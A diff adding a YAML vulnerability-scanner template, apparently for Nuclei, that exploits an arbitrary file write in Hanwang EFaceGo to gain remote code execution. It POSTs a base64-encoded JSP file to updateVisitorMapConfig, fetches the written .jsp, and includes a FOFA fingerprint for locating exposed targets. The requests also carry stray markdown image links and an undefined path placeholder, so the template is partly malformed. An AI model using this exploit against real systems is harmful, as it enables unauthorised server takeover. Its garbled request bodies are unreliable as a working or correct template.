@@ -1,0 +1,31 @@
+id: poc-gy065imrgmk9de9a
+info:
+  name: 汉王EFaceGo updateVisitorMapConfig 任意文件写入导致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gy065imrgmk9de9a'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gy065imrgmk9de9a
+    fofa: icon_hash="1380907357"
+http:
+- raw:
+  - "POST /manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken=SGUsqvF7cVS HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"id\": 1,\n  \"mapName\": \"test\",\n  \"fileType\": \"jsp\",\n  \"updatedPhoto\": \"PCUgb3V0LnByaW50KCJIZWxsbyBXb3JsZCEiKTsgJT4=\"\n}\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856652947-3223c9ed-fd62-4787-b3e0-e5fd5b6c191d.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /manage/resource/{updatedPhotoPath}.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856653130-fe2f4f18-dbd8-4662-a05a-30e6aa00d50c.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
